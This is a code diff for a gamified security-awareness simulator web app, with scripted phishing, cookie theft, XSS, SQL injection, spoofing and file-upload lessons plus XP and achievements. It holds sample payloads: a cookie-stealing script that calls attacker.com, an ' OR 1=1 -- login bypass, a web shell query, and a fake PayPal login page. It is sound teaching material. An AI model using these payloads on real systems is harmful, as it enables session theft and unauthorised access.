+      const existing = userStats.completedList.find(c => c.id === activeSim.id);
+      if (!existing) {
+        userStats.completedList.push({
+          id: activeSim.id,
+          title: activeSim.title,
+          difficulty: activeSim.difficulty,
+          stars: stars,
+          date: new Date().toLocaleDateString()
+        });
+      } else {
+        // Update highscore stars if new score is better
+        if (stars > existing.stars) existing.stars = stars;
+      }
+
+      saveStatsToStorage();
+      renderSimulationsGrid(); // refresh locks/checkmarks
+
+      // Set Completion Modal UI Elements
+      document.getElementById('comp-xp-gained').textContent = `+${xpEarned} XP`;
+      document.getElementById('comp-choices-gained').textContent = `${correctCount}/${totalCount} Correct`;
+      document.getElementById('comp-summary-desc').textContent = activeSim.summary;
+
+      // Render tips checklist
+      const tipsList = document.getElementById('comp-tips-list');
+      tipsList.innerHTML = '';
+      activeSim.tips.forEach(tip => {
+        const li = document.createElement('li');
+        li.textContent = tip;
+        tipsList.appendChild(li);
+      });
+
+      // Render Stars display
+      const starsContainer = document.getElementById('completion-stars');
+      starsContainer.innerHTML = '';
+      for (let i = 1; i <= 3; i++) {
+        const star = document.createElement('i');
+        star.setAttribute('data-lucide', 'star');
+        star.className = `w-8 h-8 fill-current ${i <= stars ? 'text-cyberSecondary star-glow' : 'text-slate-700'}`;
+        starsContainer.appendChild(star);
+      }
+
+      // Configure Next Simulation button action
+      const nextSimBtn = document.getElementById('btn-next-sim');
+      const nextId = activeSim.id + 1;
+      const hasNext = window.simulationsData.some(s => s.id === nextId);
+
+      if (hasNext) {
+        nextSimBtn.classList.remove('hidden');
+        nextSimBtn.onclick = () => {
+          closeCompletionModal();
+          startSimulation(nextId);
+        };
+      } else {
+        nextSimBtn.classList.add('hidden');
+      }
+
+      // Open Modal view
+      document.getElementById('completion-modal').classList.remove('hidden');
+      document.getElementById('completion-modal').classList.add('flex');
+      
+      lucide.createIcons();
+    }
+
+    function closeCompletionModal() {
+      playBeep('click');
+      document.getElementById('completion-modal').classList.add('hidden');
+      document.getElementById('completion-modal').classList.remove('flex');
+      navigateTo('simulations');
+    }
+
+    // Bind simulation specific interactions
+    function bindSimulationInteractions() {
+      // 1. Phishing
+      if (activeSim.id === 1) {
+        const btnInspect = document.getElementById('btn-inspect-sender');
+        const btnReport = document.getElementById('btn-report-phish');
+        const btnDelete = document.getElementById('btn-delete-email');
+        const phishLink = document.getElementById('phish-link');
+        const output = document.getElementById('inspector-output');
+        const step2 = document.getElementById('flow-step-2');
+        const step3 = document.getElementById('flow-step-3');
+
+        if (btnInspect) {
+          btnInspect.onclick = () => {
+            playBeep('click');
+            output.innerHTML = `
+              <div class="text-cyan-400 font-bold">// Sender Header Analysis:</div>
+              <div>• Display Name: PayPal Support</div>
+              <div>• SPF Record: <span class="text-red-400 font-bold">FAIL</span> (Domain paypaI-updates.com is not verified by PayPal Inc.)</div>
+              <div>• DKIM Signature: <span class="text-red-400">MISSING</span></div>
+              <div>• Warning: Domain spelling contains homoglyphs!</div>
+            `;
+          };
+        }
+
+        if (phishLink) {
+          phishLink.onclick = (e) => {
+            e.preventDefault();
+            playBeep('click');
+            
+            // Highlight right window flow
+            if (step2) step2.className = 'p-3 bg-red-950/30 rounded border border-red-500 flex items-center space-x-3 transition-all duration-300';
+            if (step3) step3.className = 'p-3 bg-slate-900/80 rounded border border-slate-800 flex items-center space-x-3 transition-all duration-300';
+            
+            // Swap left window to phishing site
+            const leftContainer = document.getElementById('arena-left-container');
+            leftContainer.innerHTML = `
+              <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
+                <div class="bg-slate-950 p-2 rounded-t border-t border-x border-slate-700 flex items-center space-x-2 text-[10px]">
+                  <span class="text-red-400">⚠️ Insecure</span>
+                  <div class="flex-1 bg-slate-900 px-2 py-1 rounded text-red-400 font-mono text-[10px] truncate select-all">
+                    http://secure-verify.paypaI-updates.com/webscr/login
+                  </div>
+                </div>
+                
+                <div class="flex-1 bg-white text-slate-900 p-4 rounded-b flex flex-col justify-center items-center">
+                  <div class="w-16 mb-2 text-center text-blue-800 font-extrabold font-serif text-lg">PayPal</div>
+                  <h3 class="text-xs font-bold mb-3">Verification Required</h3>
+                  <div class="w-full max-w-[200px] space-y-2">
+                    <input type="text" placeholder="Email Address" class="w-full border p-1.5 text-xs rounded" value="user@gmail.com" disabled>
+                    <input type="password" id="phish-pass" placeholder="Password" class="w-full border p-1.5 text-xs rounded focus:outline-none focus:border-blue-500">
+                    <button id="btn-phish-login" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-1.5 rounded text-[10px]">Log In</button>
+                  </div>
+                </div>
+              </div>
+            `;
+            
+            // Bind input behaviors
+            const btnPhish = document.getElementById('btn-phish-login');
+            if (btnPhish) {
+              btnPhish.onclick = () => {
+                playBeep('fail');
+                if (step3) step3.className = 'p-3 bg-red-950/30 rounded border border-red-500 flex items-center space-x-3 transition-all duration-300';
+                output.innerHTML = `
+                  <div class="text-red-400 font-bold">[ATTACK ALERT]:</div>
+                  <div>• Password Entered. Payload exfiltrating...</div>
+                  <div>• Destination: http://paypaI-updates.com/harvester.php</div>
+                  <div class="text-red-400 font-bold font-mono mt-1">Credentials Stolen by Attacker!</div>
+                `;
+              };
+            }
+          };
+        }
+      }
+
+      // 3. Cookie Theft
+      if (activeSim.id === 3) {
+        const btnSecure = document.getElementById('btn-secure-cookie');
+        if (btnSecure) {
+          btnSecure.onclick = () => {
+            playBeep('success');
+            
+            // Change cookie set header in HTML representation
+            const leftContainer = document.getElementById('arena-left-container');
+            leftContainer.innerHTML = `
+              <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
+                <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 font-mono text-xs mb-4">
+                  <div class="text-emerald-400">// Secure HTTP Response Headers</div>
+                  <div class="mt-2 text-slate-300">HTTP/1.1 200 OK</div>
+                  <div class="text-slate-300">Content-Type: text/html</div>
+                  <div class="text-slate-300 bg-emerald-950/40 p-1 border border-emerald-900/50 rounded mt-1">
+                    Set-Cookie: session_id=xyz789; Path=/; Domain=shop.com; <span class="text-emerald-400 font-bold">Secure; HttpOnly</span>
+                  </div>
+                  <div class="text-[10px] text-emerald-400 mt-1">✓ Verified: Active Mitigation flags present!</div>
+                </div>
+
+                <div class="flex-grow bg-slate-950 p-3 rounded border border-slate-850 space-y-3">
+                  <div class="text-sm font-semibold">Active Session Console</div>
+                  <div class="p-2 bg-slate-900 rounded font-mono text-[11px] text-slate-300">
+                    <div>&gt; console.log(document.cookie);</div>
+                    <div class="text-red-400">"" (Empty string - JavaScript access denied!)</div>
+                  </div>
+                  <div class="text-xs text-emerald-400 bg-emerald-950/10 p-2 rounded border border-emerald-900/40">
+                    HttpOnly protects cookie data. Script injections can no longer copy active session tokens.
+                  </div>
+                </div>
+              </div>
+            `;
+            
+            // Update flow representation
+            const cookieFlow = document.getElementById('cookie-flow');
+            const cookieStatus = document.getElementById('cookie-status');
+            if (cookieFlow) {
+              cookieFlow.className = 'absolute top-[-8px] left-[10%] w-5 h-5 bg-emerald-500 rounded-full flex items-center justify-center text-[10px] font-bold text-slate-950';
+              cookieFlow.style.animation = 'none';
+              cookieFlow.textContent = '🔒';
+            }
+            if (cookieStatus) {
+              cookieStatus.textContent = 'HttpOnly is Active! JavaScript cannot read tokens.';
+              cookieStatus.className = 'text-center text-[10px] text-emerald-400 mt-4';
+            }
+          };
+        }
+      }
+
+      // 8. XSS Awareness
+      if (activeSim.id === 8) {
+        const btnPreset = document.getElementById('btn-insert-payload');
+        const btnSubmit = document.getElementById('btn-submit-comment');
+        const input = document.getElementById('comment-input');
+        const stream = document.getElementById('comment-stream');
+        
+        const step1 = document.getElementById('xss-step-1');
+        const step2 = document.getElementById('xss-step-2');
+        const step3 = document.getElementById('xss-step-3');
+
+        if (btnPreset) {
+          btnPreset.onclick = () => {
+            playBeep('click');
+            input.value = `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`;
+          };
+        }
+
+        if (btnSubmit) {
+          btnSubmit.onclick = () => {
+            const comment = input.value.trim();
+            if (!comment) return;
+            
+            playBeep('fail');
+
+            // Render raw in stream (simulating vulnerability)
+            const div = document.createElement('div');
+            div.className = 'p-2 bg-red-950/20 border border-red-900/40 rounded text-xs text-red-300 font-mono';
+            div.innerHTML = `<span class="text-red-400 font-bold">Hacker:</span> ${comment}`;
+            stream.appendChild(div);
+            
+            input.value = '';
+
+            // Run right window pipeline alert
+            if (step1) step1.className = 'p-2 bg-red-950/30 rounded border border-red-500 text-[10px] text-slate-200';
+            setTimeout(() => {
+              if (step2) step2.className = 'p-2 bg-red-950/30 rounded border border-red-500 text-[10px] text-slate-200';
+            }, 800);
+            setTimeout(() => {
+              if (step3) step3.className = 'p-2 bg-red-950/30 rounded border border-red-500 text-[10px] text-slate-200';
+              alert("SIMULATED EXPLOIT: JavaScript ran inside sandbox browser context and retrieved token!");
+            }, 1600);
+          };
+        }
+      }
+
+      // 9. SQL Injection
+      if (activeSim.id === 9) {
+        const btnPreset = document.getElementById('btn-sql-preset');
+        const btnSubmit = document.getElementById('btn-sql-submit');
+        const usernameInput = document.getElementById('sql-username');
+        const passwordInput = document.getElementById('sql-password');
+        const queryDisplay = document.getElementById('sql-query-display');
+        const evalResult = document.getElementById('sql-evaluation-result');
+
+        if (btnPreset) {
+          btnPreset.onclick = () => {
+            playBeep('click');
+            usernameInput.value = `' OR 1=1 --`;
+            passwordInput.value = `anything`;
+            queryDisplay.textContent = `SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything';`;
+          };
+        }
+
+        if (btnSubmit) {
+          btnSubmit.onclick = () => {
+            const user = usernameInput.value || 'admin';
+            const pass = passwordInput.value || '';
+            
+            if (user === `' OR 1=1 --`) {
+              playBeep('fail');
+              queryDisplay.innerHTML = `SELECT * FROM users WHERE username = '<span class="text-red-400 font-bold">' OR 1=1 --</span>' AND password = '${pass}';`;
+              evalResult.className = 'text-[10px] text-red-400 mt-2 font-bold';
+              evalResult.innerHTML = `
+                ⚠️ SQL Logic Compromised!<br>
+                • Condition "1=1" is always TRUE.<br>
+                • trailing comments "--" discard password checks.<br>
+                • Authentication Bypassed! Logged in as: admin
+              `;
+            } else {
+              playBeep('click');
+              queryDisplay.textContent = `SELECT * FROM users WHERE username = '${user}' AND password = '${pass}';`;
+              evalResult.className = 'text-[10px] text-amber-500 mt-2';
+              evalResult.textContent = `Login Failed: Credentials invalid. Query logic intact.`;
+            }
+          };
+        }
+      }
+
+      // 11. Clickjacking Opacity Slider
+      if (activeSim.id === 11) {
+        const slider = document.getElementById('clickjack-slider');
+        const hiddenIframe = document.getElementById('hidden-iframe');
+        
+        if (slider && hiddenIframe) {
+          slider.oninput = (e) => {
+            const val = e.target.value;
+            hiddenIframe.style.opacity = val / 100;
+          };
+        }
+      }
+
+      // 12. URL Spoofing
+      if (activeSim.id === 12) {
+        const btnPuny = document.getElementById('btn-toggle-puny');
+        const spoofedDisplay = document.getElementById('spoofed-domain-display');
+        const punyResult = document.getElementById('punycode-result');
+
+        if (btnPuny) {
+          btnPuny.onclick = () => {
+            playBeep('click');
+            if (spoofedDisplay.textContent === 'аpple.com') {
+              spoofedDisplay.textContent = 'xn--pple-43d.com';
+              punyResult.className = 'block bg-red-950/20 p-1.5 border border-red-800 text-red-400 text-[10px] font-bold';
+            } else {
+              spoofedDisplay.textContent = 'аpple.com';
+              punyResult.className = 'block bg-slate-900 p-1 text-slate-350 text-[10px]';
+            }
+          };
+        }
+      }
+
+      // 13. Fake CAPTCHA
+      if (activeSim.id === 13) {
+        const btnCopy = document.getElementById('btn-copy-captcha');
+        if (btnCopy) {
+          btnCopy.onclick = () => {
+            playBeep('click');
+            btnCopy.textContent = 'Copied!';
+            btnCopy.className = 'bg-emerald-600 text-white font-semibold text-xs px-4 py-2 rounded transition';
+            setTimeout(() => {
+              btnCopy.textContent = 'Copy Verification Code';
+              btnCopy.className = 'bg-orange-500 text-white font-semibold text-xs px-4 py-2 rounded hover:bg-orange-600 transition';
+            }, 1500);
+          };
+        }
+      }
+
+      // 14. Notification Alert Box
+      if (activeSim.id === 14) {
+        const btnAllow = document.getElementById('btn-notify-allow');
+        const btnBlock = document.getElementById('btn-notify-block');
+        const leftContainer = document.getElementById('arena-left-container');
+
+        if (btnAllow) {
+          btnAllow.onclick = () => {
+            playBeep('fail');
+            
+            // Cascade virus alert cards in Left Container
+            leftContainer.innerHTML = `
+              <div class="p-4 bg-slate-950 h-full rounded flex flex-col font-sans text-slate-200 overflow-y-auto space-y-2 relative">
+                <div class="text-[10px] text-red-500 border border-red-900/50 p-1.5 rounded bg-red-950/20 font-mono text-center">
+                  ⚠️ SIMULATED ATTACK SPAM ACTIVE
+                </div>
+                
+                <div class="bg-white text-slate-800 p-3 rounded shadow-lg border-l-4 border-yellow-500 text-xs">
+                  <div class="font-bold flex items-center"><span class="mr-1">🚨</span> System Health Notice</div>
+                  <p class="text-[10px] mt-0.5">Critical error detected. Download protection patch immediately.</p>
+                </div>
+
+                <div class="bg-white text-slate-800 p-3 rounded shadow-lg border-l-4 border-red-600 text-xs">
+                  <div class="font-bold flex items-center"><span class="mr-1">⚠️</span> Virus Alert!</div>
+                  <p class="text-[10px] mt-0.5">Your credit card logins are exposed. Clean immediately.</p>
+                </div>
+                
+                <div class="bg-white text-slate-800 p-3 rounded shadow-lg border-l-4 border-yellow-500 text-xs">
+                  <div class="font-bold flex items-center"><span class="mr-1">🎁</span> Prize Claim</div>
+                  <p class="text-[10px] mt-0.5">Your Amazon raffle prize is waiting. Click here to confirm.</p>
+                </div>
+              </div>
+            `;
+          };
+        }
+
+        if (btnBlock) {
+          btnBlock.onclick = () => {
+            playBeep('success');
+            leftContainer.innerHTML = `
+              <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200 items-center justify-center text-center">
+                <div class="w-12 h-12 rounded-full bg-emerald-950 border border-emerald-500 flex items-center justify-center text-emerald-400 text-xl mb-3">✓</div>
+                <div class="text-sm font-bold">Permissions Blocked</div>
+                <p class="text-xs text-slate-400 max-w-xs mt-1">The spam campaign is blocked. No cookies, push subscriptions, or alerts were registered.</p>
+              </div>
+            `;
+          };
+        }
+      }
+
+      // 16. Double Extensions
+      if (activeSim.id === 16) {
+        const btnToggle = document.getElementById('btn-toggle-ext');
+        const fileName = document.getElementById('file-name-display');
+        const fileType = document.getElementById('file-type-display');
+
+        if (btnToggle) {
+          btnToggle.onclick = () => {
+            playBeep('click');
+            if (fileName.textContent === 'invoice_2026.pdf') {
+              fileName.textContent = 'invoice_2026.pdf.exe';
+              fileType.textContent = 'Application (.exe)';
+              fileType.className = 'text-red-400 font-bold';
+            } else {
+              fileName.textContent = 'invoice_2026.pdf';
+              fileType.textContent = 'PDF Document';
+              fileType.className = 'text-slate-400';
+            }
+          };
+        }
+      }
+
+      // 18. File Upload script payload
+      if (activeSim.id === 18) {
+        const btnPreset = document.getElementById('btn-upload-preset');
+        const btnSubmit = document.getElementById('btn-upload-submit');
+        const fileDisplay = document.getElementById('upload-file-display');
+
+        if (btnPreset) {
+          btnPreset.onclick = () => {
+            playBeep('click');
+            fileDisplay.textContent = 'avatar.jpg.php';
+            fileDisplay.className = 'text-red-400 font-mono font-bold';
+          };
+        }
+
+        if (btnSubmit) {
+          btnSubmit.onclick = () => {
+            if (fileDisplay.textContent === 'avatar.jpg.php') {
+              playBeep('fail');
+              alert("SIMULATED EXPLOIT: Script uploaded. Sending cmd request: GET /uploads/avatar.jpg.php?cmd=whoami -> returns server admin token!");
+            } else {
+              playBeep('success');
+              alert("File uploaded safely.");
+            }
+          };
+        }
+      }
+    }
+
+    // Achievements System
+    function renderAchievements() {
+      const container = document.getElementById('achievements-container');
+      if (!container) return;
+      container.innerHTML = '';
+
+      const list = [
+        { name: "First Defense", desc: "Launch your first simulation", unlocked: userStats.completedList.length >= 1, icon: "shield-alert" },
+        { name: "Phish Detector", desc: "Complete Phishing Simulation", unlocked: userStats.completedList.some(c => c.id === 1), icon: "mail" },
+        { name: "SQL Inspector", desc: "Complete SQL Injection Simulation", unlocked: userStats.completedList.some(c => c.id === 9), icon: "database" },
+        { name: "Session Sentinel", desc: "Complete Cookie Theft Simulation", unlocked: userStats.completedList.some(c => c.id === 3), icon: "cookie" },
+        { name: "Elite Guardian", desc: "Earn over 1500 XP", unlocked: userStats.xp >= 1500, icon: "award" },
+        { name: "Grandmaster", desc: "Secure all 40 simulation nodes", unlocked: userStats.completedList.length === 40, icon: "shield" }
+      ];
+
+      list.forEach(ach => {
+        container.innerHTML += `
+          <div class="p-3 rounded-lg border ${ach.unlocked ? 'bg-cyan-950/20 border-cyan-500/30' : 'bg-slate-900/40 border-slate-800 opacity-50'} text-left space-y-1">
+            <div class="flex items-center space-x-2">
+              <i data-lucide="${ach.icon}" class="w-4 h-4 ${ach.unlocked ? 'text-cyberSecondary' : 'text-slate-500'}"></i>
+              <span class="text-xs font-bold ${ach.unlocked ? 'text-white' : 'text-slate-400'}">${ach.name}</span>
+            </div>
+            <p class="text-[10px] text-slate-500 leading-snug">${ach.desc}</p>
+          </div>
+        `;
+      });
+      lucide.createIcons();
+    }
+
+    // Progress History Table render
+    function renderHistoryTable() {
+      const tbody = document.getElementById('progress-history-tbody');
+      if (!tbody) return;
+      tbody.innerHTML = '';
+
+      if (userStats.completedList.length === 0) {
+        tbody.innerHTML = `
+          <tr>
+            <td colspan="4" class="text-center py-6 text-slate-500">No completed simulation records registered.</td>
+          </tr>
+        `;
+        return;
+      }
+
+      // Sort by ID
+      const sorted = [...userStats.completedList].sort((a,b) => a.id - b.id);
+      sorted.forEach(item => {
+        let starsHtml = '';
+        for (let i = 1; i <= 3; i++) {
+          starsHtml += `<i data-lucide="star" class="w-3.5 h-3.5 fill-current inline-block ${i <= item.stars ? 'text-cyberSecondary' : 'text-slate-700'}"></i>`;
+        }
+
+        tbody.innerHTML += `
+          <tr class="border-b border-slate-800/60 hover:bg-slate-900/25">
+            <td class="py-3 text-white font-semibold">${item.id}. ${item.title}</td>
+            <td class="py-3"><span class="px-2 py-0.5 rounded text-[10px] border ${item.difficulty === 'Beginner' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' : item.difficulty === 'Intermediate' ? 'bg-amber-500/10 text-amber-400 border-amber-500/20' : 'bg-rose-500/10 text-rose-400 border-rose-500/20'}">${item.difficulty}</span></td>
+            <td class="py-3 text-slate-400 font-mono text-[10px]">${item.date}</td>
+            <td class="py-3 text-right">${starsHtml}</td>
+          </tr>
+        `;
+      });
+      lucide.createIcons();
+    }
+
+    // Save profile username settings
+    function saveUsername() {
+      playBeep('success');
+      const input = document.getElementById('profile-username');
+      userStats.username = input.value.trim() || "Agent Zoro";
+      saveStatsToStorage();
+      alert("Username saved successfully.");
+    }
+
+    // Settings Toggle Sound
+    function toggleSound() {
+      playBeep('click');
+      soundEnabled = !soundEnabled;
+      localStorage.setItem('sound_enabled', soundEnabled);
+      
+      const btn = document.getElementById('btn-toggle-sound');
+      btn.textContent = soundEnabled ? 'ENABLED' : 'DISABLED';
+      btn.className = soundEnabled ? 'px-4 py-1.5 rounded-lg bg-cyberSecondary text-slate-950 font-bold text-xs font-mono' : 'px-4 py-1.5 rounded-lg bg-slate-800 text-slate-400 font-bold text-xs font-mono';
+    }
+
+    // Settings Toggle Neon Glow Borders
+    function toggleNeonGlow() {
+      playBeep('click');
+      neonGlowEnabled = !neonGlowEnabled;
+      localStorage.setItem('neon_glow', neonGlowEnabled);
+
+      const btn = document.getElementById('btn-toggle-neon');
+      btn.textContent = neonGlowEnabled ? 'ENABLED' : 'DISABLED';
+      btn.className = neonGlowEnabled ? 'px-4 py-1.5 rounded-lg bg-cyberSecondary text-slate-950 font-bold text-xs font-mono' : 'px-4 py-1.5 rounded-lg bg-slate-800 text-slate-400 font-bold text-xs font-mono';
+      
+      applyNeonGlowStyle();
+    }
+
+    function applyNeonGlowStyle() {
+      const cards = document.querySelectorAll('.glass-card');
+      cards.forEach(card => {
+        if (neonGlowEnabled) {
+          card.style.boxShadow = '0 8px 32px 0 rgba(0, 0, 0, 0.37)';
+        } else {
+          card.style.boxShadow = 'none';
+        }
+      });
+    }
+
+    // Reset Progress Modal Actions
+    function openResetModal() {
+      playBeep('click');
+      document.getElementById('reset-modal').classList.remove('hidden');
+      document.getElementById('reset-modal').classList.add('flex');
+    }
+
+    function closeResetModal() {
+      playBeep('click');
+      document.getElementById('reset-modal').classList.add('hidden');
+      document.getElementById('reset-modal').classList.remove('flex');
+    }
+
+    function confirmReset() {
+      userStats = {
+        username: "Agent Zoro",
+        xp: 0,
+        completedList: [],
+        historyAnswers: []
+      };
+      saveStatsToStorage();
+      closeResetModal();
+      renderSimulationsGrid();
+      playBeep('success');
+      alert("All simulator progress registers have been reset.");
+      navigateTo('home');
+    }
+  </script>
+</body>
+</html>
